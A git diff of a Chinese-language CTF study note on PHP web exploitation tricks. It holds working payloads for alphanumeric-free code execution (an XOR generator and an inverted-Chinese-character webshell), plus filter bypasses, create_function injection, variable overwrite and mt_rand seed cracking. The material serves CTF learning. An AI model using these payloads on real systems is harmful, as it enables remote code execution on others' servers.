@@ -5,7 +5,7 @@ categories:
 - PHP
 tags:
 - PHP
-date: 2024-05-16 16:26:44
+date: 2024-09-24 17:18:52
 ---
 
 # PHP 的补充知识点
@@ -70,6 +70,14 @@ date: 2024-05-16 16:26:44
 
 3. 可以使用 `unset(变量)` 来删除一个变量。但是在局部作用域中，无法删除全局变量。
 
+4. 动态函数执行，即函数名可以存在变量里面：
+    ```php
+    $a = "system";
+    $a("whoami");
+    ```
+
+    这是可以执行的。
+
 ### 2.4 数组运算符
 
 1. `+` 相同的键不覆盖，如果想要覆盖，采用函数 `array_merge(数组1, ...)`
@@ -98,7 +106,37 @@ date: 2024-05-16 16:26:44
 1. `include_once` 和 `require_once` 表示只会引入一次。文件包含的实质就是直接将其他的 PHP 文件内容复制粘贴过来。使用 `_once` 可以避免重复定义问题。 
 2. 一般引入公共函数、库时用 `_once` 。
 
+### 2.7 接收输入参数
+
+1. 常见的 `$_GET` 和 `$_POST` 就不用说了，别忘了两者都是数组。
+
+2. 此外全部超级变量数组 `$_SERVER` 也能获取到 URL 中的参数。常见的就是 `$_SERVER[QUERY_STRING]`，该变量获取 `?` 后面的内容。
+    细节详见：
+
+    > https://www.cnblogs.com/thinksasa/archive/2012/11/11/2765141.html
+
+    这里想强调的是，`$_SERVER[QUERY_STRING]` 在接收参数时，相对于常见的 `$_GET` 和 `$_POST`，其不会进行 `urldecode()`（但是依旧可以正常接收到参数并赋值到对应变量。），因此当使用 `$_SERVER[QUERY_STRING]` 接收参数时，可以考虑 URL 编码绕过过滤。
+    例题：[BJDCTF2020]EzPHP。
+
+3. `$_REQUEST` 数组也能接收 GET 和 POST 的参数（甚至是 Cookie）。其最大的特点是有一个接收的先后顺序（涉及覆盖）。详细内容可见：
+
+    > https://blog.csdn.net/weixin_40675515/article/details/78273404
+
+    一般情况下，POST 相比 GET 传入的内容优先级更高（也就是会覆盖 GET 的内容）。在 CTF 中会涉及到：
+    ```php
+    if($_REQUEST) { 
+        foreach($_REQUEST as $value) { 
+            if(preg_match('/[a-zA-Z]/i', $value))  
+                die('fxck you! I hate English!'); 
+        } 
+    }
+    ```
+
+    例题：[BJDCTF2020]EzPHP。
+
 ## 3. 常用的一些危险函数
+
+1. 能查看到 phpinfo 的尽量查看，可以看到 `disable_functions`。
 
 ### 3.1 打印相关
 
@@ -112,12 +150,12 @@ date: 2024-05-16 16:26:44
     > var_dump — Dumps information about a variable. This function displays structured information about one or more expressions that includes its type and value. Arrays and objects are explored recursively with values indented to show structure.
     > **var_export()** gets structured information about the given variable. It is similar to [var_dump()](https://www.php.net/manual/en/function.var-dump.php) with one exception: the returned representation is valid PHP code.
 
-#### 3.1.2 `file_get_content()` 和 `highlight_file()`
+#### 3.1.2 `file_get_contents()` 和 `highlight_file()`
 
 1. 这两个都是用来打印文件内容的。
-2. `file_get_content()` 返回的结果是 `string`，失败则返回 `false`。
+2. `file_get_contents()` 返回的结果是 `string`，失败则返回 `false`。
 3. `highlight_file()` 就是彩色返回内容。
-4. `file_get_content()` 接收的变量的内容如果外部可控（例如通过 GET），这时需要借助**文件相关的伪协议以传入文件流**，例如 `file` 或者 `data` 伪协议，普通的 `str` 会报错。
+4. `file_get_contents()` 接收的变量的内容如果外部可控（例如通过 GET），这时需要借助**文件相关的伪协议以传入文件流**，例如 `file` 或者 `data` 伪协议，普通的 `str` 会报错。
 
 ### 3.2 文件和文件夹相关操作
 
@@ -140,6 +178,10 @@ date: 2024-05-16 16:26:44
 2. 一般直接输入一个字符的十进制 ASCII 就行。
 
 3. 这个方法就可以绕过一些代码层面上的过滤。
+
+#### 3.3.2 `hex2bin()`
+
+
 
 ### 3.4 返回值为特殊字符或自定义输入的函数
 
@@ -175,7 +217,28 @@ date: 2024-05-16 16:26:44
 
 2. 有关第一点的 16 进制数，PHP 对其进行 MD5 的 16 进制加密后，生成的实际是 含 16 进制数的字符串。至于后续解析成看得懂的字符的过程，实际上是 MySQL 在操作。在字符串上下文，十六进制字符串中的每一对十六进制数字会根据十六进制的 ASCII 表，被转换成一个字符。
 
-3. PHP 中，GET 或者 POST 所传递的变量的内容，可以是数组。也就是 PHP 的数组语法。
+3. PHP 中，GET 或者 POST 所传递的变量的内容，可以是数组。也就是 PHP 的数组语法。同时对于 MD5 绕过中的数组绕过，也可以用于**其他加密**，例如 SHA1，例题：[BJDCTF2020]EzPHP。
+
+4. 以往常见的题型中，使用数组绕过只是为了绕过 `if` 的判断，但是如果绕过的数据还要被当作**字符串**，用于命令执行当中，那么数组绕过就不能使用（因为数组转字符串是有问题的），因此在 PHP7+ 的版本，考虑使用含有 `tostring()` 的内部类。这里普遍使用 PHP 中的 Exception 相关的类：
+    ```php
+    <?php
+    # 不同行不同
+    $a = new Error("1", 1);
+    $b = new Error("1", 2);
+    echo md5($a) . "\n";
+    echo md5($b) . "\n";
+    echo $a . "\n";
+    echo $b . "\n";
+    echo "\n";
+    # 相同行相同
+    $c = new Error("2", 1);$d = new Error("2", 2);
+    echo md5($c) . "\n";
+    echo md5($d) . "\n";
+    ```
+
+    注意使用该方法时，需要保证两个变量**在同一行**定义。因为 `Error` 和 `Exception` 等内置类的 `tostring()`，是包含行号的：
+    ![image-20240825042548535](PHP/image-20240825042548535.png)
+    参考例题：[极客大挑战 2020]Greatphp
 
 ### 4.3 针对黑名单函数的绕过
 
@@ -293,99 +356,391 @@ date: 2024-05-16 16:26:44
 1. 很小的知识点，知道两个函数就行。
 2. `unset($变量)` 会将变量销毁。
 3. `extract($_GET|$_POST)`，会从 GET 和 POST 中将同名变量的值覆盖掉，例如传 `cmd=calc` 就会将 PHP 中变量 `$cmd` 的内容变成 `calc`。
+    扩展一下，其一般形式是 `extract($var)` ，如果 `$var` 可控，那么就可以导致变量覆盖。例如：
 
-### 4.8 反序列化逃逸
-
-1. 序列化后能**成功序列化的字符串**的**长度是固定的**，后面多余的部分会被直接截断。
-
-2. 题目经常会对序列化后的敏感内容进行过滤，以 [安洵杯 2019]easy_serialize_php 1 为例，其过滤函数就是：
     ```php
-    function filter($img){
-        $filter_arr = array('php','flag','php5','php4','fl1g');
-        $filter = '/'.implode('|',$filter_arr).'/i';
-        return preg_replace($filter,'',$img);
+    $num = 1;
+    $var = $_GET['var'];
+    extract($var);
+    # 这时如果传入 var[num] = 2，那么 $num = 2;
+    ```
+    
+4. 有时候思路还需要扩展一下，题目中虽然没有使用 `extract()`，但是用户是可以控制的，例如 LCTF bestphp's revenge：
+    ```php
+    <?php
+    highlight_file(__FILE__);
+    $b = 'implode';
+    # 这里是可控点，如果 $_GET['f'] 是 extract，那么就可以导致变量覆盖
+    call_user_func($_GET['f'], $_POST);
+    session_start();
+    if (isset($_GET['name'])) {
+        $_SESSION['name'] = $_GET['name'];
     }
-    $serialize_info = filter(serialize($_SESSION));
+    var_dump($_SESSION);
+    $a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
+    # 如果变量覆盖了，这里就可以再次进行 RCE
+    call_user_func($b, $a);
+    ?>
     ```
 
-3. 个人认为，这种逃逸的题目的两个关键是：
+### 4.8 Hash 长度扩展攻击 - 非 PHP 专属
 
-    1. 序列化格式被破坏。
-    2. 长度被破坏。
+1. 详细介绍可以看：
 
-#### 4.8.1 字符减少的情况 - 以 [安洵杯 2019]easy_serialize_php 1 为例
+    > https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html
 
-1. 题目代码：
-    ```php
-     <?php
-    
-    $function = @$_GET['f'];
-    
-    function filter($img){
-        $filter_arr = array('php','flag','php5','php4','fl1g');
-        $filter = '/'.implode('|',$filter_arr).'/i';
-        return preg_replace($filter,'',$img);
-    }
-    
-    
-    if($_SESSION){
-        unset($_SESSION);
-    }
-    
-    $_SESSION["user"] = 'guest';
-    $_SESSION['function'] = $function;
-    
-    extract($_POST);
-    
-    if(!$function){
-        echo '<a href="index.php?f=highlight_file">source_code</a>';
-    }
-    
-    if(!$_GET['img_path']){
-        $_SESSION['img'] = base64_encode('guest_img.png');
-    }else{
-        $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
-    }
-    
-    $serialize_info = filter(serialize($_SESSION));
-    
-    if($function == 'highlight_file'){
-        highlight_file('index.php');
-    }else if($function == 'phpinfo'){
-        eval('phpinfo();'); //maybe you can find something in here!
-    }else if($function == 'show_image'){
-        $userinfo = unserialize($serialize_info);
-        echo file_get_contents(base64_decode($userinfo['img']));
-    } 
+    密码学的看不懂，直接上使用方法。
+
+2. 网上教程都说用的脚本：
+
+    > git clone https://gitee.com/ljcppp/HashPump
+
+    也可以用 python 中的 Hashpumpy 模块。
+
+3. HashPump 使用：
+    ![image-20240701135120092](PHP/image-20240701135120092.png)
+
+4. Hashpumpy  使用方法：
+
+    ```python
+    import hashpumpy
+    # 使用函数 hashpumpy，基本和 HashPump 的参数对应
+    # hexdigest: 原 Hash 值
+    # original_data: 原先的数据部分，即不包含随机数/密钥/密文的数据部分
+    # data_to_add: 数据部分想要额外添加的数据
+    # key_length: 原先密钥/密文的长度
+    # return: 一个元祖，包含新的 Hash 和新的数据部分
+    print(hashpumpy.hashpump(hexdigest, original_data, data_to_add, key_length))
     ```
 
-2. 序列化格式被破坏 - 表现为吞掉[键的所有和]值的序列化前缀（以后都叫前缀）。
-    具体来说，就是在字符减少的情况下，原先的序列化格式遭到破坏，例如以本题的过滤函数为例，序列化数据（一对键值对） `s:7:"flagphp";s:3:"***";` 就会变成 `s:7:"";s:3:"***";`。此时键的长度和指定的长度不匹配，必然会报错。
-    因此，为了保证结构不被破坏，那其必然会向后寻找字符作为键的内容，例如这时假如序列化数据正确的话，那么键的内容就变成了 `";s:3:"` 共 7 个字符。显然其值的（序列化）前缀被吞掉。上述是键内容逃逸，当然也可以让值内容逃逸。
+5. 例题：[De1CTF 2019]SSRF Me 1
+    上图的 HashPump 的使用图就是该题的解。注意要将 `\x` 转换成 `%` 用于 Web 传输。一定要注意把哪些部分当成密文，哪些部分当成数据。
 
-3. 键的内容逃逸：
+### 4.9 过滤限制的一些绕过 - 常见是正则的一些过滤
 
-    1. 键的内容被过滤后，必然会向后吞掉其值的前缀。因此要额外构造一个值供该键匹配。
-    2. 例如本题，想要构造的内容大概是：
-        `a:2:{s:4:"flag";s:xx:";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`。
-        其中的一对用户可输入的键值对是 `flag => ;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`，如果长度对的情况下，后面的 `";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`就会被截断。
-        这里的 xx 表示长度，预估输入的内容的长度是两位数。
-    3. 分析一下，其吞掉的内容应该是 `";s:xx:`，这样后面的 `;s:3:"img"...` 才能符合序列化的结果以被解析，且双引号正好闭合键的内容；因此吞掉的空间，也就是空位是 7 个字符。
-    4. 所以我们要空出 7 个空间，因此输入的键的内容是 `flagphp`。
-    5. 接着看，吞掉后，前面 `flagphp` 的值没了，其后面的 `img` 是键，不能作为其的值，不然键值数量不匹配（一个键值对，一个单独的键），所以要为 `flagphp` 创建一个值。
-    6. 这里需要注意的是，被截断部分的开头是有个双引号的，这个双引号是序列化时生成的，我们要把他截掉，那么原先的长度肯定是包含他的，现在要截取他，因此我们空出的空间实际上就是 7 + 1 = 8 个。因此构造出来的值要占据 8 个空间，所以可以构造 `;s:1:"1"`，长度恰好为 8，把他塞入 `img` 的前面，就可以作为 `flagphp` 的值了。
-    7. 所以 payload 为：
-        `_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`。
+#### 4.9.1 异或、取反、自增（常用于无字符 RCE）
 
-4. 值的内容逃逸
+1. 详见这篇文章：
 
-    1. 相比键的内容逃逸，值的内容逃逸将下一个键值对的**键和值的前缀**（输入的内容为下一个键值对的值的内容）和一个双引号一起消耗（两种情况总之要把想覆盖内容的键值对的**前面都给变成前一对键值对的键或值的内容**），那序列化时就要补一个键值对，所以相比键构造就要**多一个键值对**。
-    2. 例如我们想构造：
-        `a:3:{s:1:"a";s:xx:"被消去的内容";s:1:"b";s:xx:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`。
-        其中 xx 依旧表示我们带输入内容的长度，预估不会超过两位数。
-    3. 同样的，`a` 的值内容应该是 `";s:1:"b";s:xx:"`，这样才能保证 `img` 作为键有效。可以看出，需要至少 15 个空位（至少是因为 "b" 可以变长）。
-    4. 因此前面还是腾出 15 个空位，末尾需要补充一个键值对以保证键值对的数量对上，同时长度还要对上。因此需要长度为 16 的一个键值对（别忘了结尾有个双引号要截断，从而腾出一个空位）。所以构造 `s:1:"1";s:1:"1";`，这样就填上了空位。
-    5. 所以最终的 payload 可以是：
-        `_SESSION[a]=flagflagflagphp&_SESSION[b]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"1";}`。
+    > https://blog.csdn.net/qq_61778128/article/details/127063407
+    > https://mochu.blog.csdn.net/article/details/104631142
+    > https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
 
-5. 上述内容忽略了一个情况：那就是 `img` 的内容编码后长度一致，恰巧都是 20 个字符。假设新的长度是 20+ 而不是 20，那么在假定空位固定的情况下，其会被占掉一部分。以键的内容逃逸为例，如果长度为 23，那么原本的空位为 7，多出来 3 个字符占空位，那么导致构造出来的值的长度就是 7 - 3 + 1 = 5，那么此时构造的值的内容就是 `;i:11`。同样的，如果缩短，那么空位就会多出来，值的长度就要增加。
+2. 一般这种题型输入的内容都是当作 PHP 代码执行，那么是可以传入**变量**的。
+    之所以强调该内容，是因为通过这些绕过方法获得的内容都是字符串，想要将其执行的话，需要结合 PHP 的[动态函数](#2.3 函数)特性；使用变量来存储字符串的值，然后执行。
+
+3. 当然，如果输入的内容直接进入变量，那么可以不用赋值到变量内，直接 `(编码)(参数)`。
+
+4. 异或关键字的构造分为两种，一种是**一位一位**的构造，然后用 `.` 相连，另外一种就是直接用两个长字符串相连。现在题目中都会限制长度，所以第一种的方法用的不多。脚本如下：
+    ```python
+    # -*- encoding: utf-8 -*-
+    """
+    @File    : XOR.py
+    @Time    : 2024/7/29 17:00
+    @Author  : EndlessShw
+    @Email   : 1502309758@qq.com
+    @Software: PyCharm
+    """
+    
+    # 从 ASCII 的 128 向后开始。直接使用 ASCII 128 后面的字符可以直接绕过所有可打印字符过滤。
+    def getOneChar(char):
+        for a in range(128, 255):
+            for b in range(128, 255):
+                if (a ^ b) == ord(char):
+                    return [str(hex(a))[-2:], str(hex(b))[-2:]]
+    
+    
+    # 处理逻辑就是将 10 进制转成 16 进制，不需要什么 URL 编码，也不需要先转换成字符后再转。先转字符的话，一个字符会产生两个 URL 编码。
+    def main():
+        raw_str = "_GET"
+        left_part = ""
+        right_part = ""
+        for char in raw_str:
+            result = getOneChar(char)
+            left_part += "%" + result[0]
+            right_part += "%" + result[1]
+        # ${"_GET"}，根据 ${function()} 变成 ${返回值}，则 ${"_GET"} 等价于 $_GET
+        # $_GET{} 等价于 $_GET[]
+        result = '$[{}^{}][{}]();&{}=phpinfo'.format(left_part, right_part, str(left_part)[0:3], str(left_part)[0:3])
+        print(result.replace('[', '{').replace(']', '}'))
+    
+    
+    if __name__ == '__main__':
+        main()
+    ```
+
+    该脚本用于执行**单个不带参数函数**，如果需要含参数的话，还需要进行修改。也可以获取 PHP 代码的转换。
+
+5. 取反的构造有一个优点：那就是可以完全用不到**单引号、双引号和字母**。异或的 payload 是 URL 编码，如果在非 GET 和 POST 中，那么**其可能绕不过过滤和 waf。**参考例题：[SUCTF 2018]GetShell 1，这题是上传文件，针对文件内容的过滤，URL 编码没法解析。
+    常见的取反一般要么经过**一次 URL 编码**（和异或一样，因为要用于 **GET 和 POST**），要么利用汉字中的某个字符取反。（P 神的思路）这里主要讲第二种，在 P 神的思路上更近一步，汉字可以不用加单双引号：
+    ![image-20240803163542717](PHP/image-20240803163542717.png)
+    可以看到在 PHP 5.6.27 中，依旧可以打印出，只不过会包警告和提示，不影响使用。
+    给出一个 payload：
+
+    ```php
+    <?=
+    $_=[];
+    $__=($_==$_);
+    $_=~(瞰);
+    $___=$_[$__];
+    $_=~(北);
+    $___.=$_[$__];
+    $_=~(北);
+    $___.=$_[$__];
+    $_=~(的);
+    $___.=$_[$__];
+    $_=~(南);
+    $___.=$_[$__];
+    $_=~(择);
+    $___.=$_[$__];
+    $____=~(~(_));
+    $_=~(说);
+    $____.=$_[$__];
+    $_=~(小);
+    $____.=$_[$__];
+    $_=~(笔);
+    $____.=$_[$__];
+    $_=~(站);
+    $____.=$_[$__];
+    $_=$$____;
+    $___($_[_]);
+    # 来自 https://www.cnblogs.com/z2gh/p/18302990
+    # 这个 payload 没有用 [] 来框定字符范围。默认应该取 [1]。
+    # 他给出的脚本：
+    <?php
+     
+    header('Content-Type: text/html; charset=utf-8');//防止页面出现乱码
+    $str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';
+    $payload = "$_POST[1]";
+    $result = "";
+    $num = 0;
+    for ($i = 0; $i < mb_strlen($str, 'utf-8'); $i++) {
+     
+        $st = mb_substr($str, $i, 1, 'utf-8');//每次取一个
+        $a = ~($st);
+        $b = $a[1];//汉字的第一位
+        if ($b == $payload[$num] && $num != strlen($payload)) {
+            $num++;
+            $result .= $st;
+        }
+        if ($num === strlen($payload)) {
+            break;
+        }
+    }
+    echo $result;
+    ```
+
+#### 4.9.2 `preg_match()` 相关绕过方法
+
+1. 如果 `preg_match()` 中指定的表达式**没有** `/s`，那么他默认**只匹配第一行**。而且如果**表达式**末尾是 `$`，那么其会**忽略末尾的 `%0a` 换行符**。
+    例题：[FBCTF2019]RCEService 1、[MRCTF2020]套娃 1
+
+2. PHP 利用 PCRE 回溯次数限制绕过 `preg_match()`。
+    详见 P 神的文章：
+
+    > https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html
+
+    例题：[FBCTF2019]RCEService 1
+
+3. 如果 `preg_match()` 接收的参数/变量是数组，那么其会返回 false 而不是数字 0 或 1。
+
+#### 4.9.3 无参数构造 RCE
+
+1. 首先，无参数构造 RCE 的底层和无字符 RCE 一样，也就是输入的 Payload 一定会被当成 PHP 代码执行（常见的特征就是 `eval()` 的参数）。
+
+2. 其次，这种题目常见的 `preg_match` 过滤表达式就是：
+    ```php
+    if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']){
+        eval($_GET['exp']);
+    }
+    ```
+
+    也就是说，输入的表达式经过过滤后，只剩下一个 `;`，匹配的规则大概是“单个无参函数”和“单个无参函数内的嵌套”，因为一旦有参数，就会引入 `'` 和 `"`，从而不满足表达式。
+
+3. 参考：
+
+    > https://blog.csdn.net/Manuffer/article/details/120738755
+
+    文章总结的很好，内容比较全，用到直接打就行。
+
+4. 参考例题：[TSCTF-J2024]RCE_ME!!!
+
+### 4.10 `basename()` 利用
+
+1. 这篇文章写的很好：
+
+    > https://www.cnblogs.com/yesec/p/15429527.html
+
+2. 例题也就是 [Zer0pts2020]Can you guess it? 1
+
+3. 但是我本地测试了一下，却没有这种效果，应该是某些 PHP 版本会这样。
+
+### 4.11 PHP mt_rand() 破解
+
+1. 主要看这篇文章：
+
+    > https://www.freebuf.com/vuls/192012.html
+    > https://www.openwall.com/php_mt_seed/README
+
+2. 这里主要强调一下：
+    工具 php_mt_seed 中，两个参数表示“函数 `mt_rand()` 首次输出的范围。”
+    四个参数的前两个参数和两个参数时的结果一样。但是后两个参数表示**传入 `mt_rand()` 函数时指定的随机数范围**。而在文章中，说的是：
+    ![image-20240707163049802](PHP/image-20240707163049802.png)
+
+3. 以 [GWCTF 2019]枯燥的抽奖 1 为例，首先题目给出了随机数的使用：
+    ```php+HTML
+    Jpao49vN7F
+    <?php
+    #这不是抽奖程序的源代码！不许看！
+    header("Content-Type: text/html;charset=utf-8");
+    session_start();
+    if(!isset($_SESSION['seed'])){
+    $_SESSION['seed']=rand(0,999999999);
+    }
+    
+    # 指定了随机数的种子
+    mt_srand($_SESSION['seed']);
+    $str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    $str='';
+    $len1=20;
+    for ( $i = 0; $i < $len1; $i++ ){
+        # 这里的意思是从 $str_long1 中随机抽一个字符出来拼接。
+        # 可以看到 mt_rand() 的范围就是 0 ~ strlen($str_long1) - 1
+        $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+    }
+    $str_show = substr($str, 0, 10);
+    echo "<p id='p1'>".$str_show."</p>";
+    
+    
+    if(isset($_POST['num'])){
+        if($_POST['num']===$str){x
+            echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
+        }
+        else{
+            echo "<p id=flag>没抽中哦，再试试吧</p>";
+        }
+    }
+    show_source("check.php"); 
+    ```
+
+4. 题目给出了前 10 个字符，那么结合变量 `$str_long1`，我们可以反推出前 10 个数所生成的数字：
+    ```python
+    def main():
+        str1 = 'Jpao49vN7F'
+        str2 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        result = ''
+    
+        length = str(len(str2) - 1)
+        for i in range(0, len(str1)):
+            for j in range(0, len(str2)):
+                if str1[i] == str2[j]:
+                    # 根据四个字符的格式，前两个字符代表首次输出范围，这里就是固定的一个数字，后两个字符代表随机数总的范围，那就是 0 ~ 字符串的长度 - 1
+                    result += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + length + ' '
+                    break
+    
+        print(result)
+    
+    
+    if __name__ == '__main__':
+        main()
+    ```
+
+5. 然后通过工具 php_mt_seed，爆破出随机数的种子，最后使用固定种子 `mt_srand(种子数)` 跑一遍题目的思路，拿到完整的全部字符串（注意 PHP 版本）。
+
+### 4.12 `create_function()` 代码注入
+
+1. 这个函数的相关用法如下：
+
+    > https://www.php.net/manual/zh/function.create-function.php
+
+    `create_function(string $args, string $code): string`。简单来说，第一个参数用来指定所创建函数的参数列表，第二个参数里面是函数体内容。
+
+2. 这个函数最大的问题在于，其底层执行 `$code`  的函数是 `eval()`，这就导致一个问题，如果第二个参数可控，即 `$code` 可控时，那么就可以向内注入 PHP 代码，从而执行。
+    举个例子：
+
+    ```php
+    $funcName = create_function('$a, $b', 'return $a + $b;');
+    # 输出 3
+    echo $funcName(1, 2);
+    # $funcName = create_function('$a, $b', 'return $a + $b;'); 等价于：
+    function funcName($a, $b)
+    {
+        return $a + $b;
+    }
+    ```
+
+    但是如果第二个参数可控，那么就会导致：
+    ```php
+    $funcName = create_function('$a, $b', 'return $a + $b;}echo "injected";//');
+    $funcName(1, 2);
+    ```
+
+    此时就会导致：
+    ![image-20240802135956883](PHP/image-20240802135956883.png)
+    这个时候生成的函数的代码其实是：
+
+    ```php
+    function funcName()
+    {return $a + $b;}echo "injected";//}
+    ```
+
+    插入的代码就会进入到 `eval()` 中被执行。
+
+3. 例题：[BJDCTF2020]EzPHP
+
+### 4.13 `url_parse()` 解析漏洞
+
+1. 先看看 `url_parse()` 在官方中的使用方法：
+
+    > https://www.php.net/manual/zh/function.parse-url.php
+    > 总结一下需要注意的点：
+    >
+    > 1. 第二个参数 `component` 可以指定返回的内容，如果指定了返回 `string` 而不是 `array`，不存在的话还回返回 `null`。
+    > 2. 对严重不合格的 URL，会返回 `false`。
+
+2. 这位师傅的文章总结的很多：
+
+    > http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html
+
+    平常的知识点应该足以应付了，以后如果有遇到，就找个时间再补。
+
+3. 参考例题：[N1CTF 2018]eating_cms
+
+## 5. 杂项知识点
+
+1. 个人感觉是特别偏或者少见的知识点，偏杂项。也许某个地方会用到吧。
+
